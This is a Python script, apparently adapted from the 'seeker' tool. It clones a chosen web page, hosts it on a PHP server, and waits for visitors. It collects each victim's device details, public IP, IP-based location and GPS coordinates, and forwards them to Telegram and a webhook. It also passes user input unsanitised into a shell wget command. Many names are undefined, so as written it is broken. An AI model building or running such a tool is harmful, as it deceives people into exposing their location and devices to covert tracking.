import os
import subprocess
import urllib.request
import shutil
import seeker

def data_parser():
	data_row = []
	with open(INFO, 'r') as info_file:
		info_content = info_file.read()
	if not info_content or info_content.strip() == '':
		return
	try:
		info_json = loads(info_content)
	except decoder.JSONDecodeError:
		utils.print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
	else:
		var_os = info_json['os']
		var_platform = info_json['platform']
		var_cores = info_json['cores']
		var_ram = info_json['ram']
		var_vendor = info_json['vendor']
		var_render = info_json['render']
		var_res = info_json['wd'] + 'x' + info_json['ht']
		var_browser = info_json['browser']
		var_ip = info_json['ip']

		data_row.extend([var_os, var_platform, var_cores, var_ram, var_vendor, var_render, var_res, var_browser, var_ip])
		device_info = f'''{Y}[!] Device Information :{W}

{G}[+] {C}OS         : {W}{var_os}
{G}[+] {C}Platform   : {W}{var_platform}
{G}[+] {C}CPU Cores  : {W}{var_cores}
{G}[+] {C}RAM        : {W}{var_ram}
{G}[+] {C}GPU Vendor : {W}{var_vendor}
{G}[+] {C}GPU        : {W}{var_render}
{G}[+] {C}Resolution : {W}{var_res}
{G}[+] {C}Browser    : {W}{var_browser}
{G}[+] {C}Public IP  : {W}{var_ip}
'''
		utils.print(device_info)
		send_telegram(info_json, 'device_info')
		send_webhook(info_json, 'device_info')

		if ip_address(var_ip).is_private:
			utils.print(f'{Y}[!] Skipping IP recon because IP address is private{W}')
		else:
			rqst = requests.get(f'https://ipwhois.app/json/{var_ip}')
			s_code = rqst.status_code

			if s_code == 200:
				data = rqst.text
				data = loads(data)
				var_continent = str(data['continent'])
				var_country = str(data['country'])
				var_region = str(data['region'])
				var_city = str(data['city'])
				var_org = str(data['org'])
				var_isp = str(data['isp'])

				data_row.extend([var_continent, var_country, var_region, var_city, var_org, var_isp])
				ip_info = f'''{Y}[!] IP Information :{W}

{G}[+] {C}Continent : {W}{var_continent}
{G}[+] {C}Country   : {W}{var_country}
{G}[+] {C}Region    : {W}{var_region}
{G}[+] {C}City      : {W}{var_city}
{G}[+] {C}Org       : {W}{var_org}
{G}[+] {C}ISP       : {W}{var_isp}
'''
				utils.print(ip_info)
				send_telegram(data, 'ip_info')
				send_webhook(data, 'ip_info')

	with open(RESULT, 'r') as result_file:
		results = result_file.read()
		try:
			result_json = loads(results)
		except decoder.JSONDecodeError:
			utils.print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
		else:
			status = result_json['status']
			if status == 'success':
				var_lat = result_json['lat']
				var_lon = result_json['lon']
				var_acc = result_json['acc']
				var_alt = result_json['alt']
				var_dir = result_json['dir']
				var_spd = result_json['spd']

				data_row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd])
				loc_info = f'''{Y}[!] Location Information :{W}

{G}[+] {C}Latitude  : {W}{var_lat}
{G}[+] {C}Longitude : {W}{var_lon}
{G}[+] {C}Accuracy  : {W}{var_acc}
{G}[+] {C}Altitude  : {W}{var_alt}
{G}[+] {C}Direction : {W}{var_dir}
{G}[+] {C}Speed     : {W}{var_spd}
'''
				utils.print(loc_info)
				send_telegram(result_json, 'location')
				send_webhook(result_json, 'location')
				gmaps_url = f'{G}[+] {C}Google Maps : {W}https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}'
				gmaps_json = {'url': f'https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}'}
				utils.print(gmaps_url)
				send_telegram(gmaps_json, 'url')
				send_webhook(gmaps_json, 'url')

				if kml_fname is not None:
					kmlout(var_lat, var_lon)
			else:
				var_err = result_json['error']
				utils.print(f'{R}[-] {C}{var_err}\n')
				send_telegram(result_json, 'error')
				send_webhook(result_json, 'error')

	csvout(data_row)
	clear()
	return
    
def wait():
	printed = False
	while True:
		sleep(2)
		size = path.getsize(RESULT)
		if size == 0 and printed is False:
			utils.print(f'{G}[+] {C}Waiting for Client...{Y}[ctrl+c to exit]{W}\n')
			printed = True
		if size > 0:
			data_parser()
			printed = False
            
def server():
	print()
	port_free = False
	utils.print(f'{G}[+] {C}Port : {W}{port}\n')
	utils.print(f'{G}[+] {C}Starting PHP Server...{W}', end='')
	cmd = ['php', '-S', f'0.0.0.0:{port}', '-t', f'template/{SITE}/']

	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
		try:
			sock.connect(('127.0.0.1', port))
		except ConnectionRefusedError:
			port_free = True

	if not port_free and path.exists(PID_FILE):
		with open(PID_FILE, 'r') as pid_info:
			pid = int(pid_info.read().strip())
			try:
				old_proc = psutil.Process(pid)
				utils.print(f'{C}[ {R}✘{C} ]{W}')
				utils.print(f'{Y}[!] Old instance of php server found, restarting...{W}')
				utils.print(f'{G}[+] {C}Starting PHP Server...{W}', end='')
				try:
					sleep(1)
					if old_proc.status() != 'running':
						old_proc.kill()
					else:
						utils.print(f'{C}[ {R}✘{C} ]{W}')
						utils.print(f'{R}[-] {C}Unable to kill php server process, kill manually{W}')
						sys.exit()
				except psutil.NoSuchProcess:
					pass
			except psutil.NoSuchProcess:
				utils.print(f'{C}[ {R}✘{C} ]{W}')
				utils.print(f'{R}[-] {C}Port {W}{port} {C}is being used by some other service.{W}')
				sys.exit()
	elif not port_free and not path.exists(PID_FILE):
		utils.print(f'{C}[ {R}✘{C} ]{W}')
		utils.print(f'{R}[-] {C}Port {W}{port} {C}is being used by some other service.{W}')
		sys.exit()
	elif port_free:
		pass

	with open(LOG_FILE, 'w') as phplog:
		proc = subp.Popen(cmd, stdout=phplog, stderr=phplog)
		with open(PID_FILE, 'w') as pid_out:
			pid_out.write(str(proc.pid))

		sleep(3)

		try:
			php_rqst = requests.get(f'http://127.0.0.1:{port}/index.html')
			php_sc = php_rqst.status_code
			if php_sc == 200:
				utils.print(f'{C}[ {G}✔{C} ]{W}')
				print()
			else:
				utils.print(f'{C}[ {R}Status : {php_sc}{C} ]{W}')
				cl_quit()
		except requests.ConnectionError:
			utils.print(f'{C}[ {R}✘{C} ]{W}')
			cl_quit()

def cl_quit():
	sys.exit()
    
def download_html(url, userconfigpath, user_agent, proxy_config=None):
    # Verificar se o wget está disponível no sistema
    wget_available = shutil.which('wget') is not None

    if os.path.exists(url):
        print(f'O caminho fornecido é um arquivo local: {url}')
        # Copiar o arquivo diretamente para o diretório de hospedagem
        try:
            save_path = os.path.join(userconfigpath, 'web_clone', 'index.html')
            os.makedirs(os.path.dirname(save_path), exist_ok=True)
            shutil.copyfile(url, save_path)
            print(f'Arquivo {url} copiado com sucesso para {save_path}')
        except Exception as e:
            print(f"Erro ao copiar o arquivo: {e}")
    else:
        if not wget_available:
            print("Wget não está disponível, utilizando urllib...")
            # Usar urllib como fallback caso o wget não esteja instalado
            try:
                request = urllib.request.Request(url, headers={'User-Agent': user_agent})
                response = urllib.request.urlopen(request)
                html_content = response.read()

                # Salvar o conteúdo HTML baixado
                save_path = os.path.join(userconfigpath, 'web_clone', 'index.html')
                os.makedirs(os.path.dirname(save_path), exist_ok=True)

                with open(save_path, 'wb') as f:
                    f.write(html_content)

                print(f'HTML salvo com sucesso em {save_path}')
            except Exception as e:
                print(f"Erro ao baixar HTML com urllib: {e}")
        else:
            print("Wget está disponível, utilizando wget para baixar o HTML...")

            # Caso o wget esteja disponível, executa com base nas configurações fornecidas
            if check_config("WGET_DEEP").lower() == "on":
                command = '%s;wget -H -N -k -p -l 2 -nd -P template/custom_og_tags --no-check-certificate -U "%s" "%s"' % (
                    proxy_config if proxy_config else '', user_agent, url)
            else:
                command = '%s;cd template/custom_og_tags;wget --no-check-certificate -O index.html -c -k -U "%s" "%s"' % (
                    proxy_config if proxy_config else '', user_agent, url)

            try:
                subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).wait()
                print("HTML baixado com sucesso usando wget.")
            except Exception as e:
                print(f"Erro ao executar wget: {e}")

# Exemplo de uso
user_agent = "Mozilla/5.0"
proxy_config = None  # Caso tenha um proxy, pode ser passado aqui
url = input("Digite a URL ou caminho para clonar: ")
port = input("Digite a porta em que vai hospedar o HTML: ")  # Corrigido para não converter diretamente para int
userconfigpath = "template/custom_og_tags"

# Baixar ou copiar o HTML
download_html(url, userconfigpath, user_agent, proxy_config)

# Hospedar o HTML usando o seeker (assumindo que seeker.py está configurado corretamente)
try:
    server()
    wait()
    print(f"Seeker iniciado na porta {port}")
except Exception as e:
    print(f"Erro ao iniciar o seeker: {e}")
